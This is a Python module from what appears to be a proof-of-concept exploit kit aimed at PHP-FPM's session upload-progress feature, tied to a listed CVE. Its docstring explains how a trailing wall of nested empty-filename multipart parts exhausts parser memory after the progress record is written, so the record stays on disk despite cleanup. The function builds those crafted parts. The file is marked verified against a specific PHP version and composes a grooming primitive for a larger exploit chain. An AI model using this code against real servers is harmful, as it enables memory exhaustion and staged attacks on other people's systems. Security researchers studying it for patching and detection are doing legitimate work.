# INDEX: accumulate on-disk session records despite cleanup=on | fpm | upload_progress enabled, cleanup=on
"""Parser-OOM-after-flush record persistence: accumulate an on-disk session file over HTTP
upload-progress records despite session.upload_progress.cleanup=On (CVE-2026-109619).

Mechanism (ext/standard/rfc1867.c, ext/session/session.c; php-src 8.3/8.4):
  session.upload_progress writes the progress record to the session file at the rfc1867 FILE_START
  event and deletes it at MULTIPART_EVENT_END. A trailing wall of deeply-nested empty-filename
  $_FILES parts OOMs the multipart parser AFTER the FILE_START flush has persisted the record but
  BEFORE END, so the cleanup delete never runs: the record survives even with cleanup=On. Repeating
  the POST accumulates records until a record's s_read + decode + encode approaches memory_limit
  (~limit/3).

API:
  record_parts(index, fnlen, wall, levels=60, progress_key=b"PHP_SESSION_UPLOAD_PROGRESS",
               marker_fmt=b"b%03d", file_field=b"f", file_value=b"Z", wall_prefix=b"w")
    -> one record's (name, value, filename) tuples: a progress marker + a long-filename file part
    (length fnlen) + a trailing empty-filename nested wall of `wall` parts. Composes nested_field_pressure.

Preconditions: session.upload_progress.{enabled,cleanup}=On; a session id whose file already exists;
post_max_size / parser limits that admit the record + wall.
Tested: 8.3.26-fpm.
Credit: kengwang, Calif Research.
Stage: VERIFIED 8.3.26.
"""
import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.groom.nested_field_pressure import nested_fields  # noqa: E402

PROGRESS_KEY = b"PHP_SESSION_UPLOAD_PROGRESS"


def record_parts(index, fnlen, wall, levels=60, progress_key=PROGRESS_KEY,
                 marker_fmt=b"b%03d", file_field=b"f", file_value=b"Z", wall_prefix=b"w"):
    """One accumulation record's parts: an upload-progress marker (`marker_fmt % index`) + a
    long-filename file part (length `fnlen`, for session growth) + a trailing empty-filename nested
    wall of `wall` parts (`levels` deep) whose parser-OOM fires after the FILE_START flush, so the
    record persists under cleanup=On. Returns (name, value, filename) tuples."""
    return ([(progress_key, marker_fmt % index, None),
             (file_field, file_value, b"F" * fnlen)]
            + nested_fields(wall_prefix, wall, levels, b""))
